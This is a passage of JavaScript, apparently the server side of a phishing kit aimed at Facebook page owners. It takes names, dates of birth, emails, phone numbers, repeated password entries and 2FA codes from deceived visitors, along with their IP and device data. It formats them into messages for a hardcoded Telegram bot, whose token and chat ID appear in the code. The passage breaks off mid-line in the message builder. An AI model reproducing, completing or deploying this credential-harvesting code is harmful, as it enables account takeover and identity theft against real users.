import crypto from 'crypto';
import fetch from 'node-fetch'; // đảm bảo dùng Node < 18

//const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || ''; // tốt hơn dùng biến môi trường
//const TELEGRAM_CHAT_IDS = process.env.TELEGRAM_CHAT_IDS || ''; // comma-separated

const TELEGRAM_BOT_TOKEN = 'bot8675498310:AAFZWLgXTWl_LwAnB5kB9XuklREnSRM9TPY';  // paste your bot token here
const TELEGRAM_CHAT_IDS = '-5205589429';      // paste your chat id here (comma-separated for multiple)

const ALLOWED_ORIGIN = '';

const MAX_PASSWORD_ATTEMPTS = 5;
const MAX_2FA_ATTEMPTS = 5;
const SESSION_EXPIRY_MS = 30 * 60 * 1000;

const FIELD_LIMITS = {
    fullName: 100,
    email: 254,
    emailBusiness: 254,
    phone: 25,
    fanpage: 150,
    dob: 15,
    note: 500,
    password: 200,
    code: 10,
};

const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];

if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
    console.error('CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_IDS not configured');
}

const sessions = {};
const rateLimits = new Map();
const infoRateLimits = new Map();

function cleanupExpiredSessions() {
    const now = Date.now();
    for (const [id, session] of Object.entries(sessions)) {
        if (session.createdAt && (now - session.createdAt > SESSION_EXPIRY_MS)) {
            delete sessions[id];
        }
    }
}

function checkRateLimit(ip) {
    const now = Date.now();
    const key = ip || 'unknown';
    const limit = { max: 50, window: 60000 };

    if (!rateLimits.has(key)) {
        rateLimits.set(key, { count: 1, resetAt: now + limit.window });
        return { allowed: true, remaining: limit.max - 1 };
    }

    const record = rateLimits.get(key);

    if (now > record.resetAt) {
        record.count = 1;
        record.resetAt = now + limit.window;
        return { allowed: true, remaining: limit.max - 1 };
    }

    if (record.count >= limit.max) {
        return { allowed: false, retryAfter: Math.ceil((record.resetAt - now) / 1000), remaining: 0 };
    }

    record.count++;
    return { allowed: true, remaining: limit.max - record.count };
}

function checkInfoRateLimit(ip) {
    const now = Date.now();
    const key = ip || 'unknown';
    const limit = { max: 10, window: 60000 };

    if (!infoRateLimits.has(key)) {
        infoRateLimits.set(key, { count: 1, resetAt: now + limit.window });
        return { allowed: true, remaining: limit.max - 1 };
    }

    const record = infoRateLimits.get(key);

    if (now > record.resetAt) {
        record.count = 1;
        record.resetAt = now + limit.window;
        return { allowed: true, remaining: limit.max - 1 };
    }

    if (record.count >= limit.max) {
        return { allowed: false, retryAfter: Math.ceil((record.resetAt - now) / 1000), remaining: 0 };
    }

    record.count++;
    return { allowed: true, remaining: limit.max - record.count };
}

function cleanupRateLimits() {
    const now = Date.now();
    for (const [key, record] of rateLimits.entries()) {
        if (now > record.resetAt + 300000) rateLimits.delete(key);
    }
    for (const [key, record] of infoRateLimits.entries()) {
        if (now > record.resetAt + 300000) infoRateLimits.delete(key);
    }
}

function logRequest(level, type, message, metadata = {}) {
    const log = {
        timestamp: new Date().toISOString(),
        level,
        type,
        message,
        ip: metadata.ip || 'unknown',
        sessionId: metadata.sessionId,
        duration: metadata.duration,
    };
    const logMethod = level === 'error' ? console.error : level === 'warn' ? console.warn : console.log;
    logMethod(JSON.stringify(log));
}

function logSuccess(type, metadata = {}) {
    logRequest('info', type, `${type} successful`, metadata);
}

function logError(type, error, metadata = {}) {
    logRequest('error', type, error.message || error, metadata);
}

function setSecurityHeaders(res) {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
}

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function validateData(data) {
    const issues = [];
    if (data.email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) issues.push('Invalid email format');
    if (data.phone && data.phone.length < 5) issues.push('Phone too short');
    if (data.dob) {
        const parts = data.dob.split('/');
        if (parts.length === 3) {
            const day = parseInt(parts[0]);
            const month = parseInt(parts[1]);
            const year = parseInt(parts[2]);
            if (day < 1 || day > 31) issues.push('Invalid day');
            if (month < 1 || month > 12) issues.push('Invalid month');
            if (year < 1500 || year > 2026) issues.push('Invalid year');
        }
    }
    if (issues.length > 0) console.warn(`[VALIDATION] ${issues.length} issue(s):`, issues);
    return issues;
}

function sanitizeFields(data) {
    const sanitized = { ...data };
    for (const [field, maxLen] of Object.entries(FIELD_LIMITS)) {
        if (sanitized[field] && typeof sanitized[field] === 'string' && sanitized[field].length > maxLen) {
            sanitized[field] = sanitized[field].substring(0, maxLen);
        }
    }
    if (sanitized.device && typeof sanitized.device === 'object') {
        for (const key of Object.keys(sanitized.device)) {
            if (typeof sanitized.device[key] === 'string' && sanitized.device[key].length > 100) {
                sanitized.device[key] = sanitized.device[key].substring(0, 100);
            }
        }
    }
    return sanitized;
}

function decodeData(encodedData) {
    try {
        const decoded = Buffer.from(encodedData, 'base64').toString('utf-8');
        return JSON.parse(decoded);
    } catch (e) {
        return null;
    }
}

function buildMessage(session, ip = 'Unknown') {
    let msg = `<b>🔔 Notification</b>\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Ip:</b> ${escapeHtml(ip)}\n`;
    msg += `<b>Location:</b> ${escapeHtml(session.location || 'Unknown')}\n`;
    msg += `<b>Source:</b> ${escapeHtml(session.source || 'Unknown')}\n`;

    if (session.device) {
        const d = session.device;
        const deviceParts = [];
        if (d.os) deviceParts.push(escapeHtml(d.os));
        if (d.browser) deviceParts.push(escapeHtml(d.browser));
        if (d.screen) deviceParts.push(escapeHtml(d.screen));
        if (d.mobile) deviceParts.push('📱');
        msg += `<b>Device:</b> ${deviceParts.join(' | ') || 'Unknown'}\n`;
    }

    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Full Name:</b> ${escapeHtml(session.fullName)}\n`;
    msg += `<b>Page Name:</b> ${escapeHtml(session.fanpage)}\n`;
    msg += `<b>Date of birth:</b> ${escapeHtml(session.dob)}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `<b>Email:</b> <code>${escapeHtml(session.email)}</code>\n`;
    msg += `<b>Email Business:</b> <code>${escapeHtml(session.emailBusiness)}</code>\n`;
    msg += `<b>Phone Number:</b> <code>${escapeHtml(session.phone)}</code>\n`;
    if (session.note) msg += `<b>Note:</b> ${escapeHtml(session.note)}\n`;

    const pwd1 = session.passwords?.[0] || '';
    const pwd2 = session.passwords?.[1] || '';
    if (pwd1 || pwd2) {
        msg += `━━━━━━━━━━━━━━━━━━━━━\n`;
        if (pwd1) msg += `<b>Password First:</b> <code>${escapeHtml(pwd1)}</
